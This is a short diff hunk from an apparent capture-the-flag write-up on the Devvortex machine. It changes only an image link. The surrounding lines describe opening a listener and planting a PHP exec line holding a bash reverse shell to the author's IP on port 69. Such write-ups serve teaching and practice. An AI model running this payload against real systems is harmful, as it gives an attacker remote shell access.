@@ -85,7 +85,7 @@ Bingo. From here, we can code in some php that will establish a reverse shell, w
 
 On my system, I create a listener on port 69:
 
-![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6796b174-f024-468f-ba40-89cb1b41cd73)
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/0c0ffe06-12c6-470f-bb1c-04c4214facbc)
 
 Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");`, with `10.10.16.4` being my system's IP:
 
